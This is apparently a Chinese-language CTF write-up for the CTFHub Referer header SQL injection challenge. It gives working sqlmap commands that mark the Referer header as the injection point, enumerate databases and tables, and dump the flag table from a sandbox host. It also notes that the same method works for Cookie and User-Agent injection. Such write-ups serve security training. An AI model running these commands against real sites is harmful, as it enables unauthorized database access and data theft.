---
title: CTFHub Refer注入
date:2026-09-30
categories: CTFHub Web 
tags: CTFHub Web SQL注入 refer注入
---
# 题目：CTFHub Refer注入

## 题目描述
CTFHub HTTP头注入‑Referer，注入点位于HTTP请求头 Referer ，无页面直接回显，支持时间盲注、布尔盲注。
 
## 解题思路
漏洞发生在Referer请求头，后端直接把Referer字段拼入SQL语句执行。
使用sqlmap指定 --headers 把注入点放在Referer头部，依次爆破数据库→表→字段，导出数据得到flag。
 
## 解题步骤
1. 确定注入点：抓包发现Referer参数可控，后端存在SQL注入。

2. sqlmap探测数据库
python sqlmap.py -u "http://challenge-40e0804c3eeb9d81.sandbox.ctfhub.com:10800/" --headers="Referer:1*" --dbs --batch --threads=1
得到数据库： sqli

参数说明：
- --headers="Referer:1*" ： * 标记Referer头里面的注入点
-  --dbs ：爆破所有数据库
-  --batch ：全部默认回答，不用手动交互
-  --threads=1 ：必须写1，CTFHub禁止多线程，否则直接限流

3. 查表
python sqlmap.py -u "http://challenge-40e0804c3eeb9d81.sandbox.ctfhub.com:10800/" --headers="Referer:1*" -D sqli --tables --batch --threads=1
得到随机表名： kyvkjdxiro
 
4. dump导出表数据获取flag
python sqlmap.py -u "靶场地址" --headers="Referer:1*" -D sqli -T "kyvkjdxiro" --dump --batch --threads=1

## 踩坑指南
1. * 符号代表注入位置，写在 Referer:1* 的末尾，不能漏掉。
2. CTFHub靶场限流， threads 必须设置为1，开大容易请求被拦截。
3. 靶场实例有有效期，长时间跑之前确认网页实例没有销毁。
4. HTTP头注入和Cookie注入、UA注入操作逻辑一致，只需要修改 --headers 里面的键名。
 
## 知识点总结
HTTP头注入：后端直接将请求头字段带入SQL查询。
常见注入点：Cookie、User‑Agent、Referer。
sqlmap对HTTP头注入使用 --headers="字段名:值*" ，星号标记注入位置。
